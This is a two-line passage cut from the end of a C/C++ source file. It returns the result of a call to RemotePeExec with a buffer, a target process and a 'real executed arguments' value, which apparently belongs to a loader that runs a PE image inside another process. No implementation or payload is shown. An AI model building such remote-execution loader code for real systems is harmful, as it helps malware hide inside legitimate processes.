	return RemotePeExec(pBuffer, TARGET_PROCESS, REAL_EXECUTED_ARGUMENTS) ? 0 : -1;
}